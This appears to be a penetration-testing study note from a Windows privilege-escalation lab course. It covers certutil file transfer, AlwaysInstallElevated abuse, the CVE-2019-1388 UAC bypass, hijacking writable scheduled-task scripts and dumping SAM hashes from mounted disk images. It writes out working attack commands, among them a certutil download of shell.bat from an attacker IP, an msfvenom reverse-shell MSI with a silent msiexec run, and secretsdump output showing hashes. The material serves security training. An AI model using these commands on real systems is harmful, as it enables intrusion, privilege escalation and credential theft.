# Miscellaneous Techniques

**Living Off The Land Binaries and Scripts (LOLBAS):** try to use Microsoft-signed file with unusually method which this help to undetectable

**Some interesting functionality may include:**

|                        |                  |                  |
| ---------------------- | ---------------- | ---------------- |
| Code execution         | Code compilation | File transfers   |
| Persistence            | UAC bypass       | Credential theft |
| Dumping process memory | Keylogging       | Evasion          |
| DLL hijacking          |                  |                  |

***

## **Certutil**

&#x20;[certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), whose intended use is for handling certificates but can also be used to transfer files from attacker to victim machine by either downloading a file to disk or base64 encoding/decoding a file.

### **Transferring**

```powershell
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

### **Encoding File**

We can use the `-encode` flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system. when we can’t move this file

```powershell
C:\htb> certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```

### **Decoding File**

Once the new file has been created, we can use the `-decode` flag to decode the file back to its original contents.

```powershell
C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```

***

## **Always Install Elevated**

Always install with system privilege

### **Enumerating Always Install Elevated Settings**

to discover if this options is enable or not

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Our enumeration shows us that the `AlwaysInstallElevated` key exists, so the policy is indeed enabled on the target system.

### **Generating MSI Package**

We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.

```bash
irix@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

### **Executing MSI Package**

We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:

```powershell
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart

```

***

## CVE-2019-1388

The issue was in the UAC mechanism, which allow user to take a system privilege

in certificate Dialog in windows if file signed with certificate has link in filed `Issued By` this link will appear as a hyperlink and when click it turn browser with system privilege

### Exploit

First right click on the `hhupd.exe` executable and select `Run as administrator` from the menu.

![2025-07-18 16\_56\_14-hhupd.png (1396×646) - Brave.png](<../../../../.gitbook/assets/2025 07 18_16_56_14 hhupd.png_(1396646)_ _Brave.png>)

Next, click on `Show information about the publisher's certificate` to open the certificate dialog. Here we can see that the `SpcSpAgencyInfo` field is populated in the Details tab.

![image.png](<../../../../.gitbook/assets/image (3).png>)

Next, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink. Click on it and then click `OK`, and the certificate dialog will close, and a browser window will launch.

<figure><img src="../../../../.gitbook/assets/image 1 (2).png" alt=""><figcaption></figcaption></figure>

If we open `Task Manager`, we will see that the browser instance was launched as SYSTEM.

<figure><img src="../../../../.gitbook/assets/image 2 (1) (1).png" alt=""><figcaption></figcaption></figure>

Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.

<figure><img src="../../../../.gitbook/assets/image 3 (1) (1).png" alt=""><figcaption></figcaption></figure>

At this point, we can launch any program we would like as SYSTEM. Type `c:\windows\system32\cmd.exe` in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.

<figure><img src="../../../../.gitbook/assets/image 4 (1) (1).png" alt=""><figcaption></figcaption></figure>

> Microsoft released a [patch](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388) for this issue in November of 2019. Still, as many organizations fall behind on patching, we should always check for this vulnerability if we gain GUI access to a potentially vulnerable system as a low-privilege user.

***

## **Scheduled Tasks**

### **Enumerating Scheduled Tasks**

We can use the [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) command to enumerate scheduled tasks on the system

```powershell
C:\htb>  schtasks /query /fo LIST /v
 
Folder: \
INFO: There are no scheduled tasks presently available at your access level.
 
Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.
 
Folder: \Microsoft\Windows
INFO: There are no scheduled tasks presently available at your access level.
 
Folder: \Microsoft\Windows\.NET Framework
HostName:                             WINLPE-SRV01
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        5/27/2021 12:23:27 PM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
```

### **Enumerating Scheduled Tasks with PowerShell**

We can also enumerate scheduled tasks using the [Get-ScheduledTask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps) PowerShell cmdlet.

```powershell
PS C:\htb> Get-ScheduledTask | select TaskName,State
 
TaskName                                                State
--------                                                -----
.NET Framework NGEN v4.0.30319                          Ready
.NET Framework NGEN v4.0.30319 64                       Ready
.NET Framework NGEN v4.0.30319 64 Critical           Disabled
.NET Framework NGEN v4.0.30319 Critical              Disabled
AD RMS Rights Policy Template Management (Automated) Disabled
AD RMS Rights Policy Template Management (Manual)       Ready
PolicyConverter                                      Disabled
SmartScreenSpecific                                     Ready
VerifiedPublisherCertStoreCheck                      Disabled
```

we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in `C:\Windows\System32\Tasks`

### **Checking Permissions on C:\Scripts Directory**

we notice a writeable `C:\Scripts` directory that we overlooked in our initial enumeration.

```powershell
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
C:\Scripts
  **RW BUILTIN\Users**
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

We notice various scripts in this directory, such as `db-backup.ps1`, `mailbox-backup.ps1`, etc., which are also all writeable by the `BUILTIN\USERS` group. At this point, we can append a snippet of code to one of these files with the assumption that at least one of these runs on a daily, if not more frequent, basis. We write a command to send a beacon back to our C2 infrastructure and carry on with testing. The next morning when we log on, we notice a single beacon as `NT AUTHORITY\SYSTEM` on the DB01 host.&#x20;

***

## **User/Computer Description Field**

Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field. We can enumerate this quickly for local users using the [Get-LocalUser](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) cmdlet.

```powershell
PS C:\htb> Get-LocalUser

 
Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.
Guest           False   Built-in account for guest access to the computer/domain
helpdesk        True
htb-student     True
htb-student_adm True
jordan          True
logger          True
sarah           True
sccm_svc        True
secsvc          True    Network scanner - do not change password
sql_dev         True
```

***

## **Mount VHDX/VMDK**

[https://github.com/SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)

can help us to find credential, sensitive files and more

Three specific file types of interest are `.vhd`, `.vhdx`, and `.vmdk` files. These are `Virtual Hard Disk`, `Virtual Hard Disk v2` (both used by Hyper-V), and `Virtual Machine Disk` (used by VMware). Let's assume that we land on a web server and have had no luck escalating privileges, so we resort to hunting through network shares. We come across a backups share hosting a variety of `.VMDK` and `.VHDX` files whose filenames match hostnames in the network. One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. If we can escalate to SYSTEM, we can likely steal the user's NTLM password hash or Kerberos TGT ticket and take over the domain.

If we encounter any of these three files, we have options to mount them on either our local Linux or Windows attack boxes. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands.

### **Mount on Linux**

**VMDK**

```bash
irix@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

```

**VHD/VHDX**

```bash
irix@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1

```

In Windows, we can right-click on the file and choose `Mount`, or use the `Disk Management` utility to mount a `.vhd` or `.vhdx` file. If preferred, we can use the [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps) PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.

<figure><img src="../../../../.gitbook/assets/image 5 (1).png" alt=""><figcaption></figcaption></figure>

#### **Retrieving Hashes using Secretsdump.py**

Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` registry hives. We can then use a tool such as [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to extract the password hashes for local users.

```bash
irix@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)

<SNIP>
```
